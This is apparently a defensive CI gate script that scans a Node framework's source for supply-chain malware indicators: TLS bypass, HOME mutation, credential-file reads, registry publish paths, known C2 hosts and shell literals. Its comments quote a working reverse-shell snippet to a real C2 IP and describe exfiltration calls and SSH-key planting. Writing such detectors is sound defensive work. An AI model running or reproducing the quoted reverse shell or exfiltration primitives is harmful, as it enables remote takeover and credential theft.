/**
 * Registry-exfiltration / TLS-bypass / credential-injection CI gate
 * (Socket GemStuffer class).
 *
 * Socket's 2026-05-13 write-up
 * (https://socket.dev/blog/gemstuffer) documents the **GemStuffer**
 * campaign, in which a malicious Ruby script — using only the standard
 * library — exfiltrated scraped data by building a `.gem` archive in
 * `/tmp`, fabricating a credential file under a `HOME` override, and
 * publishing the archive directly to `rubygems.org/api/v1/gems` via a
 * hard-coded API key. SSL certificate verification was disabled to
 * suppress cert errors during the scraping phase. Variants that didn't
 * even shell out to `gem push` built the request by hand with
 * `Net::HTTP::Post`, defeating any "no shell-out" gate by staying inside
 * a single Ruby process.
 *
 * The same technique translates verbatim to a malicious Node package
 * that uses only `node:fs`, `node:os`, and the global `fetch`:
 *
 *   1. **TLS verification bypass** to scrape internal or victim-side
 *      endpoints without cert warnings —
 *      `process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"`, or an
 *      `https.Agent({ rejectUnauthorized: false })`, or a `fetch` /
 *      `tls.connect` option of `rejectUnauthorized: false`.
 *   2. **`HOME` / npm-credential-file mutation** to inject a publish
 *      token into a fabricated home directory and then run `npm publish`
 *      / `pnpm publish` (already blocked by `verify-no-remote-exec`'s
 *      `child_process` ban) OR to leak a token from the consumer's real
 *      `~/.npmrc` by reading `os.homedir() + "/.npmrc"`.
 *   3. **Direct POST to a package-registry publish endpoint** — the
 *      "skip-the-CLI" GemStuffer variant translated to Node would
 *      construct a `fetch("https://registry.npmjs.org/-/npm/v1/...",
 *      { method: "POST", body: tarball })` (or the equivalent for
 *      RubyGems, PyPI, crates.io, Hex.pm) inside the runtime source
 *      itself. No `child_process` is needed; the entire exfil pipeline
 *      runs inside one Node process using only stdlib + global `fetch`.
 *
 * Daloy's runtime source (`src/**`) MUST NOT do any of the above. This
 * gate refuses to merge a PR that adds:
 *
 *   - `rejectUnauthorized: false` (any object-literal property
 *     assigning the literal `false` to `rejectUnauthorized`) — used by
 *     `https`, `tls`, `node-fetch`, `undici`, etc.
 *   - `NODE_TLS_REJECT_UNAUTHORIZED` as an environment-variable mutation
 *     target (`process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"`).
 *   - `process.env.HOME = ...` mutation (GemStuffer's HOME redirect).
 *   - String literals referencing the publish path of any major package
 *     registry: `registry.npmjs.org/-/npm/v1/...`, `rubygems.org/api/v1`,
 *     `upload.pypi.org`, `crates.io/api/v1/crates/new`, `hex.pm/api/...`.
 *   - Reads of `~/.npmrc`, `~/.yarnrc`, `~/.netrc`, `~/.gem/credentials`
 *     (host credential files the malicious package would slurp).
 *
 * This gate is the regression net for the GemStuffer attack class.
 * Combined with `verify-no-remote-exec` (no `child_process` / no `vm` /
 * no `eval` / no `new Function` / no remote dynamic `import`), a
 * malicious republish of `@daloyjs/core` has no in-process exfiltration
 * channel: it cannot shell out to `npm publish`, it cannot fetch an
 * internal endpoint with cert verification disabled, and it cannot POST
 * a tarball to a registry endpoint directly from runtime code.
 *
 * Exit code:
 *   0 — no forbidden primitives found in `src/**`.
 *   1 — at least one was found; offending lines printed to stderr.
 *
 * ---
 *
 * **RATatouille / rand-user-agent extension (Aikido 2025-05-06, since 0.34.0):**
 * https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise
 *
 * The malicious `rand-user-agent@{1.0.110, 2.0.83, 2.0.84}` publishes hid a
 * Remote Access Trojan inside `dist/index.js` whose decoded payload used
 * four pieces of tradecraft that don't trip the upstream `child_process` /
 * `vm` / `eval` / `new Function` / TLS-bypass gates:
 *
 *   1. `global['r'] = require` then `const c = global.r; c('child_process')`
 *      — aliased-require to bypass static `require('child_process')`
 *      regex detection.
 *   2. `module.paths.push(path.join(os.homedir(), '.node_modules',
 *      'node_modules'))` — manual NODE_PATH injection so the malware
 *      could `require('axios')` / `require('socket.io-client')` after
 *      side-installing them into a hidden `~/.node_modules` directory.
 *   3. A leading-dot `~/.node_modules` hidden install dir — never used
 *      by legitimate Node tooling (real `node_modules` has no leading
 *      dot) and a clean IOC.
 *   4. Hard-coded raw-IPv4 `http://` / `ws://` C2 URLs (the documented
 *      RATatouille C2 was `http://85.239.62.36:3306` for socket.io and
 *      `http://85.239.62.36:27017/u/f` for file exfil).
 *
 * Daloy's runtime source MUST NOT do any of these. Combined with the
 * existing `verify-no-remote-exec` ban on `child_process` / `vm` /
 * `eval` / `new Function` / remote dynamic `import()`, a malicious
 * republish of `@daloyjs/core` has no in-process channel left to land
 * a RATatouille-shape RAT — the aliased-require trick is moot when
 * there's no `child_process` to call through it, and side-loading a
 * fetched `axios` is moot when there's no `.node_modules` path
 * injection to make it resolvable.
 *
 * ---
 *
 * **Telegram-bot SSH-backdoor extension (Socket 2025-04-18):**
 * https://socket.dev/blog/npm-malware-targets-telegram-bot-developers
 *
 * Three typosquatted npm packages (`node-telegram-utils`,
 * `node-telegram-bots-api`, `node-telegram-util`) impersonated the
 * legitimate `node-telegram-bot-api` and, on Linux only, called an
 * `addBotId()` routine from the library constructor that:
 *
 *   1. `fs.mkdirSync(path.join(os.homedir(), ".ssh"), { mode: 0o700 })`
 *      and `fs.appendFileSync(path.join(os.homedir(),
 *      ".ssh/authorized_keys"), publicKey)` — wrote two attacker SSH
 *      public keys into the consumer's `~/.ssh/authorized_keys`,
 *      granting persistent passwordless SSH login that survives
 *      uninstalling the package.
 *   2. `https.get("https://ipinfo.io/ip", ...)` — used a public
 *      IP-discovery endpoint to fingerprint the victim's external IP
 *      address as a DNS-less host-mapping step.
 *   3. `https.get("https://solana.validator.blog/v1/check?ip=" + ip +
 *      "&name=" + os.userInfo().username)` — POSTed the external IP
 *      and Unix username to a registered C2 domain disguised as a
 *      Solana validator analytics host, confirming the compromise.
 *
 * None of these primitives touch `child_process`, `vm`, `eval`,
 * `new Function`, or a remote `import()`, so the upstream
 * `verify-no-remote-exec` gate does NOT see them. They also don't
 * disable TLS or mutate HOME, so the upstream GemStuffer-class gates
 * above don't see them either. Daloy's runtime source has no
 * legitimate reason to ever touch `~/.ssh/`, `authorized_keys`,
 * `ipinfo.io/ip` (or its peers `icanhazip.com` / `ifconfig.me` /
 * `api.ipify.org` / `checkip.amazonaws.com`), or the documented
 * `solana.validator.blog` C2 host, so this gate refuses each as a
 * bare-literal IOC. Combined with `minimum-release-age=1440` and
 * `ignore-scripts=true` (which keep the typosquats from running on
 * `pnpm install`) and `verify-no-runtime-deps` (which keeps `@daloyjs/core`
 * at zero runtime deps, so a typosquat of one of our transitive deps
 * cannot exist), a malicious republish of `@daloyjs/core` itself has
 * no channel left to drop in an `addBotId()`-shape SSH-key-injection
 * backdoor.
 *
 * ---
 *
 * **Advcash / `@naderabdi/merchant-advcash` reverse-shell extension
 * (Socket 2025-04-14,
 * https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell):**
 *
 * The malicious `@naderabdi/merchant-advcash` package posed as a
 * legitimate Advcash payment-gateway integration (with believable
 * SHA-256 hashing, request validation, currency checks, and
 * `url_success(req, res)` callback wiring) but hid a self-executing
 * reverse shell at the top of the success callback:
 *
 *   ```js
 *   (function(){
 *     var net = require("net"),
 *         cp  = require("child_process"),
 *         sh  = cp.spawn("/bin/sh", []);
 *     var client = new net.Socket();
 *     client.connect(8443, "65.109.184.223", function(){
 *       client.pipe(sh.stdin);
 *       sh.stdout.pipe(client);
 *       sh.stderr.pipe(client);
 *     });
 *     return /a/; // suppress crash
 *   })();
 *   ```
 *
 * The payload only detonates AT RUNTIME during a successful payment
 * (not at install or import), which lets it evade install-time
 * scanners and `ignore-scripts=true` cooldown gates. The
 * upstream `verify-no-remote-exec` ban on `child_process` already
 * stops the `cp.spawn("/bin/sh", ...)` half of this in `src/**`, and
 * `verify-no-registry-exfiltration`'s raw-IPv4-URL gate catches an
 * `http://65.109.184.223:8443/...` C2 URL — but the Advcash variant
 * dials TCP directly via `client.connect(8443, "65.109.184.223")`,
 * so the IOC IP appears as a **bare literal** rather than inside an
 * `http(s)://` URL. This gate adds two belt-and-braces literals:
 *
 *   1. The bare IOC IP `65.109.184.223`, mirroring the
 *      `85.239.62.36` (RATatouille) bare-literal IOC.
 *   2. The reverse-shell shell prefixes `/bin/sh`, `/bin/bash`,
 *      `/bin/zsh`, and the Windows `cmd.exe` shell — none of which
 *      have any legitimate use as a string literal inside Daloy's
 *      TypeScript/JavaScript runtime source. Even if a future
 *      `child_process` ban bypass landed (e.g. an
 *      `eval`-from-base64 trick that reconstructs `"child_process"`
 *      at runtime), a `spawn("/bin/sh", ...)`-shape reverse shell
 *      would still need the shell name as a literal somewhere — and
 *      this gate refuses that.
 *
 * @since 0.50.0
 */

import { readdir, readFile, stat } from "node:fs/promises";
import { relative } from "node:path";

const SRC_ROOT = new URL("../src/", import.meta.url);

export interface ForbiddenRegistryExfilCall {
  readonly file: string;
  readonly line: number;
  readonly text: string;
  readonly reason: string;
}

interface ForbiddenPattern {
  readonly re: RegExp;
  readonly reason: string;
  /** When true the pattern is checked against the line WITH string literals
   *  intact (so host-name string matches still work). When false it is
   *  checked against the line with string literals stripped (so a doc
   *  string mentioning the pattern doesn't trip). */
  readonly keepStrings: boolean;
}

/**
 * Patterns that must NEVER appear in `src/**`. Documented inline against
 * the GemStuffer TTPs they would enable in a Node port of the attack.
 */
const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
  // ---- TLS verification bypass (GemStuffer's `VERIFY_NONE`) ----
  {
    re: /\brejectUnauthorized\s*:\s*false\b/,
    reason:
      "`rejectUnauthorized: false` disables TLS certificate validation (GemStuffer-class VERIFY_NONE); " +
      "use the system CA bundle and a real hostname instead",
    keepStrings: false,
  },
  {
    re: /\bNODE_TLS_REJECT_UNAUTHORIZED\b/,
    reason:
      "`NODE_TLS_REJECT_UNAUTHORIZED` mutation disables TLS certificate validation " +
      "process-wide (GemStuffer-class VERIFY_NONE); never set this from library code",
    keepStrings: true,
  },
  // ---- HOME / credential-file mutation (GemStuffer's HOME override) ----
  {
    // `process.env.HOME =` (assignment, not read). Use a negative
    // lookahead for `==` / `===` so equality comparisons don't trip.
    re: /\bprocess\.env\.HOME\s*=(?!=)/,
    reason:
      "`process.env.HOME = ...` redirects the home directory and is the GemStuffer " +
      "credential-injection primitive; library code must never mutate HOME",
    keepStrings: false,
  },
  // ---- Direct POST to a package-registry publish endpoint ----
  // The full publish-path literals below are the actual exfiltration
  // endpoints — a runtime mention of any of them inside `src/**` is a
  // strong IOC of the "POST tarball to registry from inside the
  // process" variant. The bare host names (e.g. just `registry.npmjs.org`)
  // are NOT blocked — clients legitimately reference registry hosts in
  // user-facing docs / error messages — only the publish API paths.
  {
    re: /registry\.npmjs\.org\/-\/npm\/v1\//,
    reason:
      "npm publish-API path in source can exfiltrate data as a tarball POST (GemStuffer class); " +
      "Daloy never publishes from runtime — remove this string",
    keepStrings: true,
  },
  {
    re: /rubygems\.org\/api\/v1\/gems\b/,
    reason:
      "RubyGems publish-API path in source can exfiltrate data as a `.gem` POST (GemStuffer class); " +
      "Daloy never publishes from runtime — remove this string",
    keepStrings: true,
  },
  {
    re: /upload\.pypi\.org\/legacy/,
    reason:
      "PyPI publish-API path in source can exfiltrate data as a wheel POST (GemStuffer class); " +
      "Daloy never publishes from runtime — remove this string",
    keepStrings: true,
  },
  {
    re: /crates\.io\/api\/v1\/crates\/new\b/,
    reason:
      "crates.io publish-API path in source can exfiltrate data as a crate POST (GemStuffer class); " +
      "Daloy never publishes from runtime — remove this string",
    keepStrings: true,
  },
  // ---- Reads of host credential files ----
  {
    re: /\/\.npmrc\b/,
    reason:
      "library code must not reference `~/.npmrc`; GemStuffer-class attacks slurp host npm tokens " +
      "from the user's home directory",
    keepStrings: true,
  },
  {
    re: /\/\.yarnrc(?:\.yml)?\b/,
    reason:
      "library code must not reference `~/.yarnrc` / `~/.yarnrc.yml`; GemStuffer-class attacks slurp " +
      "host yarn tokens from the user's home directory",
    keepStrings: true,
  },
  {
    re: /\/\.netrc\b/,
    reason:
      "library code must not reference `~/.netrc`; GemStuffer-class attacks slurp host HTTP " +
      "credentials from the user's home directory",
    keepStrings: true,
  },
  {
    re: /\/\.gem\/credentials\b/,
    reason:
      "library code must not reference `~/.gem/credentials`; this is the exact path GemStuffer " +
      "writes a fabricated RubyGems token to",
    keepStrings: true,
  },
  // ---- Lazarus / Jade Sleet npm campaign (Socket 2023-07-25, GitHub
  //      security alert) — paired-package token handoff via
  //      `~/.vscode/jsontoken` and a typosquat C2 host. See
  //      https://socket.dev/blog/social-engineering-campaign-npm-malware
  //      and https://github.blog/2023-07-18-security-alert-social-engineering-campaign-targets-technology-industry-employees/ ----
  {
    // Catches `/.vscode/`, `\\.vscode\\` (Windows path literals), etc.
    // Daloy core has no business touching the user's IDE config dir;
    // the Jade Sleet "first package writes token, second package
    // reads token" handoff is staged at `$HOME/.vscode/jsontoken`.
    re: /[\\/]\.vscode[\\/]/,
    reason:
      "library code must not reference `~/.vscode/` — Daloy never touches the user's IDE config " +
      "directory, and `$HOME/.vscode/jsontoken` is the exact path the Lazarus / Jade Sleet paired-package " +
      "npm campaign uses to hand off a token between its first-stage and second-stage packages " +
      "(https://socket.dev/blog/social-engineering-campaign-npm-malware)",
    keepStrings: true,
  },
  {
    // `npmjsregister.com` is the documented C2 host the Lazarus / Jade
    // Sleet packages POST scraped data to (`/checkupdate.php`,
    // `/getupdate.php`). Any mention in `src/**` is a hard IOC.
    re: /\bnpmjsregister\.com\b/i,
    reason:
      "library code must not reference `npmjsregister.com` — this is the documented Lazarus / Jade " +
      "Sleet npm-campaign C2 host (typosquat of `registry.npmjs.org`) used for `/checkupdate.php` and " +
      "`/getupdate.php` exfiltration endpoints (https://socket.dev/blog/social-engineering-campaign-npm-malware)",
    keepStrings: true,
  },
  // ---- RATatouille / rand-user-agent supply-chain compromise
  //      (Aikido 2025-05-06, https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise) ----
  {
    // Aliased-require: `global.r = require`, `global['r'] = require`,
    // `globalThis.r = require`. RATatouille used `global['r'] = require`
    // then `const c = global.r; c('child_process')` to bypass any
    // gate that grep'd for the literal `require('child_process')`.
    // Library code has no legitimate reason to hand `require` to a
    // global; the module-level binding is always in scope.
    // Note: `keepStrings: false` strips string literals to `""`, so the
    // bracket-key alt accepts `[""]` (zero chars between the quotes)
    // to match `global["r"] = require` after stripping.
    re: /\b(?:global|globalThis)\s*(?:\.\s*[A-Za-z_$][\w$]*|\[\s*["'][^"']*["']\s*\])\s*=\s*require\b/,
    reason:
      "aliased-require (`global.X = require`) is the RATatouille obfuscation trick used to bypass " +
      "static `require('child_process')` detection; library code must call `require` directly so " +
      "gates like `verify-no-remote-exec` can see the module name",
    keepStrings: false,
  },
  {
    // Manual NODE_PATH injection. RATatouille pushed
    // `path.join(homedir, '.node_modules', 'node_modules')` onto
    // `module.paths` so a side-installed malicious `axios` /
    // `socket.io-client` became resolvable. Daloy core never mutates
    // module-resolution paths at runtime.
    re: /\bmodule\s*\.\s*paths\s*\.\s*(?:push|unshift|splice|fill)\b/,
    reason:
      "`module.paths.push(...)` injects extra NODE_PATH entries at runtime; this is the RATatouille " +
      "primitive for side-loading a fetched `axios` / `socket.io-client` from a hidden home-directory " +
      "install dir, and Daloy core never does this",
    keepStrings: false,
  },
  {
    // Leading-dot `.node_modules` hidden install dir under $HOME.
    // Real `node_modules` has no leading dot — this is a clean RAT
    // IOC for the "hide deps in $HOME/.node_modules" pattern.
    re: /(?:^|["'`/\\\s(=,])\.node_modules\b/,
    reason:
      "`.node_modules` (with a leading dot) is the RATatouille hidden install dir under `$HOME` used " +
      "to stash a fetched `axios` / `socket.io-client` for the RAT; real Node `node_modules` has no " +
      "leading dot — library code must never reference this path",
    keepStrings: true,
  },
  {
    // Hard-coded raw-IPv4 host in an `http(s)://` or `ws(s)://` URL.
    // RATatouille's C2 was `http://85.239.62.36:3306` (socket.io) and
    // `http://85.239.62.36:27017/u/f` (file upload). Loopback (`127.x`),
    // unspecified-bind (`0.0.0.0`), and `localhost` are allow-listed.
    re: /\b(?:https?|wss?):\/\/(?!127\.|0\.0\.0\.0\b|localhost\b)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/,
    reason:
      "raw-IPv4 `http(s)://` / `ws(s)://` URL in source is a DNS-less command-and-control IOC " +
      "(RATatouille used `http://85.239.62.36:3306`); use a real hostname (with TLS) or restrict " +
      "to `127.0.0.1` / `0.0.0.0` / `localhost`",
    keepStrings: true,
  },
  {
    // The documented RATatouille C2 IP literal, even when not in a URL
    // (e.g. stashed in a config variable for later string-concat into
    // a URL). Mirrors the npmjsregister.com IOC pattern above.
    re: /\b85\.239\.62\.36\b/,
    reason:
      "`85.239.62.36` is the documented RATatouille / rand-user-agent C2 host " +
      "(https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  // ---- xrpl.js / Ripple SDK supply-chain compromise (Aikido 2025-04-22,
  //      https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor) ----
  //
  // The hijacked npm token published five backdoored versions of the
  // official `xrpl` Ripple SDK (`xrpl@4.2.1`, `4.2.2`, `4.2.3`, `4.2.4`,
  // and `xrpl@2.14.2`, ~140k weekly downloads, ~2.9M monthly) that
  // shipped a `checkValidityOfSeed` function inside the runtime bundle
  // — it POSTed the user's XRP wallet seed / private key to
  // `https://0x9c.xyz`. None of the malicious code was ever mirrored
  // to the public GitHub repo (no tag, no PR, no CI run); it existed
  // only in the npm tarball. The exfiltration channel was a plain
  // global `fetch` to a registered domain, so the RATatouille raw-IPv4
  // gate above does NOT catch it on its own.
  {
    re: /\b0x9c\.xyz\b/i,
    reason:
      "`0x9c.xyz` is the documented exfiltration host for the xrpl.js / Ripple SDK supply-chain " +
      "compromise (April 2025) — the malicious `checkValidityOfSeed` function in `xrpl@2.14.2` and " +
      "`xrpl@4.2.1`–`4.2.4` POSTed wallet seeds to this domain " +
      "(https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  // ---- Telegram-bot SSH-backdoor supply-chain compromise (Socket
  //      2025-04-18, https://socket.dev/blog/npm-malware-targets-telegram-bot-developers) ----
  //
  // The typosquatted `node-telegram-utils` / `node-telegram-bots-api` /
  // `node-telegram-util` packages injected attacker SSH public keys
  // into `~/.ssh/authorized_keys` and exfiltrated the victim's external
  // IP + Unix username to a registered C2 host disguised as a Solana
  // validator analytics endpoint. The primitives below are the
  // bare-literal IOCs; none have a legitimate use inside a web
  // framework's runtime source.
  {
    // The exact file the attack appends attacker SSH public keys to.
    // Daloy core has no legitimate reason to touch it.
    re: /\bauthorized_keys\b/,
    reason:
      "`authorized_keys` is the file the Telegram-bot SSH-backdoor class appends attacker-controlled " +
      "SSH public keys to in order to gain persistent passwordless SSH access to the consumer's host " +
      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); library code must never " +
      "reference this filename",
    keepStrings: true,
  },
  {
    // Reference to the user's `.ssh/` directory. Daloy never touches
    // it; the SSH-backdoor class mkdir's it to drop an
    // `authorized_keys` file when it doesn't exist yet.
    re: /[\\/]\.ssh[\\/]/,
    reason:
      "library code must not reference `~/.ssh/` — Daloy never touches the user's SSH key directory, " +
      "and the Telegram-bot SSH-backdoor class mkdirs this path to plant an `authorized_keys` file " +
      "for persistent passwordless remote login " +
      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers)",
    keepStrings: true,
  },
  {
    // The documented Telegram-bot SSH-backdoor C2 host.
    re: /\bsolana\.validator\.blog\b/i,
    reason:
      "`solana.validator.blog` is the documented C2 host for the Telegram-bot SSH-backdoor npm " +
      "campaign (`node-telegram-utils` / `node-telegram-bots-api` / `node-telegram-util`); the " +
      "malicious `addBotId()` constructor routine POSTed the victim's external IP and Unix username " +
      "to `https://solana.validator.blog/v1/check?ip=…&name=…` " +
      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers) — any reference in " +
      "`src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // Public IP-discovery endpoints. These are the DNS-less host
    // mapping primitives malicious packages use to fingerprint a
    // victim's external IP without resolving the C2 host directly.
    // `ipinfo.io/ip` was the documented Telegram-bot variant; the
    // peer hosts below (`icanhazip.com`, `ifconfig.me`, `api.ipify.org`,
    // `checkip.amazonaws.com`) are the same tradecraft used by other
    // npm-malware campaigns. None of them have a legitimate use inside
    // a backend HTTP framework — a real Daloy app that needs the
    // client IP reads it from request headers, not a public lookup.
    re: /\bipinfo\.io\/ip\b/i,
    reason:
      "`ipinfo.io/ip` is the public IP-discovery endpoint the Telegram-bot SSH-backdoor class " +
      "fingerprinted victims with before exfiltrating to its C2 host " +
      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup — any reference " +
      "in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    re: /\bicanhazip\.com\b/i,
    reason:
      "`icanhazip.com` is a public IP-discovery endpoint used by npm-malware campaigns to " +
      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup",
    keepStrings: true,
  },
  {
    re: /\bifconfig\.me\b/i,
    reason:
      "`ifconfig.me` is a public IP-discovery endpoint used by npm-malware campaigns to " +
      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup",
    keepStrings: true,
  },
  {
    re: /\bapi\.ipify\.org\b/i,
    reason:
      "`api.ipify.org` is a public IP-discovery endpoint used by npm-malware campaigns to " +
      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup",
    keepStrings: true,
  },
  {
    re: /\bcheckip\.amazonaws\.com\b/i,
    reason:
      "`checkip.amazonaws.com` is a public IP-discovery endpoint used by npm-malware campaigns to " +
      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup",
    keepStrings: true,
  },
  // ---- Advcash `@naderabdi/merchant-advcash` reverse-shell campaign
  //      (Socket 2025-04-14,
  //      https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell) ----
  //
  // The malicious package dialed a reverse shell via raw TCP
  // (`client.connect(8443, "65.109.184.223")`) — the IOC IP is a bare
  // string literal, NOT inside an `http(s)://` URL, so the raw-IPv4-URL
  // gate above does not catch it.
  {
    re: /\b65\.109\.184\.223\b/,
    reason:
      "`65.109.184.223` is the documented reverse-shell C2 host for the " +
      "`@naderabdi/merchant-advcash` payment-callback reverse-shell campaign " +
      "(https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // Reverse-shell shell prefixes. The Advcash payload calls
    // `cp.spawn("/bin/sh", [])`; other shapes in the wild use
    // `/bin/bash`, `/bin/zsh`, or `cmd.exe`. A backend HTTP framework
    // has no legitimate reason to ever materialize one of these as
    // a string literal in its runtime source — even with the
    // `child_process` ban from `verify-no-remote-exec`, this is
    // belt-and-braces against an aliased-spawn / decoded-string
    // bypass that reconstructs the module name at runtime.
    re: /["'`](?:\/bin\/(?:sh|bash|zsh|dash|ksh|ash)|cmd\.exe)\b/,
    reason:
      "shell-name literal (`/bin/sh`, `/bin/bash`, `/bin/zsh`, `/bin/dash`, `/bin/ksh`, " +
      "`/bin/ash`, `cmd.exe`) in source is the reverse-shell shell prefix used by the " +
      "`@naderabdi/merchant-advcash` payment-callback reverse-shell campaign " +
      "(`cp.spawn(\"/bin/sh\", [])`, " +
      "https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell); " +
      "Daloy core never shells out — remove this literal",
    keepStrings: true,
  },
];

const STRING_LITERAL_RE = /"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`/g;

/**
 * Find the start index of a line comment (`//`) that is NOT inside a
 * string literal. Mirrors the helper in `verify-no-remote-exec.ts` so
 * URLs embedded in string literals (`"https://..."`) aren't mistakenly
 * truncated as line comments.
 */
function findLineCommentStart(s: string): number {
  let inSingle = false;
  let inDouble = false;
  let inBacktick = false;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (c === "\\" && i + 1 < s.length) {
      i++;
      continue;
    }
    if (inSingle) {
      if (c === "'") inSingle = false;
      continue;
    }
    if (inDouble) {
      if (c === '"') inDouble = false;
      continue;
    }
    if (inBacktick) {
      if (c === "`") inBacktick = false;
      continue;
    }
    if (c === "'") {
      inSingle = true;
      continue;
    }
    if (c === '"') {
      inDouble = true;
      continue;
    }
    if (c === "`") {
      inBacktick = true;
      continue;
    }
    if (c === "/" && s[i + 1] === "/") return i;
  }
  return -1;
}

export function findForbiddenRegistryExfilCalls(
  file: string,
  source: string,
): readonly ForbiddenRegistryExfilCall[] {
  const out: ForbiddenRegistryExfilCall[] = [];
  const lines = source.split(/\r?\n/);
  let inBlockComment = false;
  for (let i = 0; i < lines.length; i++) {
    const raw = lines[i]!;
    let working = raw;
    if (inBlockComment) {
      const end = working.indexOf("*/");
      if (end < 0) continue;
      working = working.slice(end + 2);
      inBlockComment = false;
    }
    const blockOpen = working.lastIndexOf("/*");
    const blockClose = working.lastIndexOf("*/");
    if (blockOpen >= 0 && blockClose < blockOpen) {
      working = working.slice(0, blockOpen);
      inBlockComment = true;
    }
    // Strip inline block comments (`/* ... */` on the same line) before
    // the line-comment scan so a token inside an inline block comment
    // does not trip the gate.
    working = working.replace(/\/\*[\s\S]*?\*\//g, " ");
    const lineCommentIndex = findLineCommentStart(working);
    const noComments = lineCommentIndex >= 0 ? working.slice(0, lineCommentIndex) : working;
    if (noComments.trim().length === 0) continue;

    const codeOnly = noComments.replace(STRING_LITERAL_RE, '""');
    for (const pattern of FORBIDDEN_PATTERNS) {
      const haystack = pattern.keepStrings ? noComments : codeOnly;
      if (pattern.re.test(haystack)) {
        out.push({ file, line: i + 1, text: raw.trim(), reason: pattern.reason });
        break;
      }
    }
  }
  return out;
}

async function* walk(dir: URL): AsyncGenerator<string> {
  const entries = await readdir(dir, { withFileTypes: true });
  for (const entry of entries) {
    const child = new URL(entry.name + (entry.isDirectory() ? "/" : ""), dir);
    if (entry.isDirectory()) {
      yield* walk(child);
    } else if (entry.isFile() && /\.(?:m?ts|m?js)$/.test(entry.name)) {
      yield child.pathname;
    }
  }
}

async function main(): Promise<void> {
  let total = 0;
  try {
    await stat(SRC_ROOT);
  } catch (err) {
    console.error(
      `verify-no-registry-exfiltration: cannot stat src/: ${(err as Error).message}`,
    );
    process.exitCode = 1;
    return;
  }
  for await (const absolute of walk(SRC_ROOT)) {
    const rel = "src/" + relative(SRC_ROOT.pathname, absolute);
    const text = await readFile(absolute, "utf8");
    const findings = findForbiddenRegistryExfilCalls(rel, text);
    for (const f of findings) {
      console.error(
        `${f.file}:${f.line}: forbidden registry-exfiltration primitive (${f.reason}): ${f.text}`,
      );
      total++;
    }
  }
  if (total > 0) {
    console.error(
      `verify-no-registry-exfiltration: ${total} forbidden primitive${total === 1 ? "" : "s"} found. ` +
        "Core source must not disable TLS verification, mutate HOME, reference host credential " +
        "files, include package-registry publish-API paths, reference `~/.vscode/` (the Lazarus / " +
        "Jade Sleet paired-package token-handoff dir), name the `npmjsregister.com` C2 host, alias " +
        "`require` through a `global.*` binding, mutate `module.paths`, reference a `.node_modules` " +
        "hidden install dir, embed raw-IPv4 `http(s)://` / `ws(s)://` URLs / the documented " +
        "RATatouille C2 IP `85.239.62.36`, name the `0x9c.xyz` exfiltration host (xrpl.js / Ripple " +
        "SDK April 2025 compromise), reference `authorized_keys` / `~/.ssh/`, name the " +
        "`solana.validator.blog` C2 host (Telegram-bot SSH-backdoor class), or call public " +
        "IP-discovery endpoints (`ipinfo.io/ip`, `icanhazip.com`, `ifconfig.me`, `api.ipify.org`, " +
        "`checkip.amazonaws.com`). These are the runtime primitives the GemStuffer, Lazarus / Jade " +
        "Sleet, RATatouille / rand-user-agent, xrpl.js / Ripple-SDK, and Telegram-bot SSH-backdoor " +
        "classes of supply-chain attack use to scrape and exfiltrate data. See " +
        "https://socket.dev/blog/gemstuffer, " +
        "https://socket.dev/blog/social-engineering-campaign-npm-malware, " +
        "https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise, " +
        "https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor, " +
        "and https://socket.dev/blog/npm-malware-targets-telegram-bot-developers.",
    );
    process.exitCode = 1;
  }
}

if (process.argv[1]?.endsWith("verify-no-registry-exfiltration.ts")) {
  await main();
}
